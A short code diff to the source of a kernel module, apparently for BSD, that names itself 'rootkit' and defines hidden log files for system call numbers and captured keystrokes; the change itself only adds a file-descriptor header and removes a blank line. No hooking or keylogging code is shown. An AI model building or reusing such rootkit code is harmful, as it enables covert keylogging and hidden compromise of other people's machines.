@@ -21,6 +21,7 @@
 #include <sys/resourcevar.h>
 #include <sys/fcntl.h>
 #include <sys/errno.h>
+#include <sys/filedesc.h>
 
 #include <sys/systm.h>
 #include <sys/pcpu.h>
@@ -31,7 +32,6 @@
 #define MODULE_NAME "rootkit"
 #define LOGFILE "/etc/good_luck_finding_this/syscall_number.txt"
 #define KEYSTROKE "/etc/good_luck_finding_this/keystrokes.txt"
-
 
 
 #define R_FLAG_READ		0b00000001
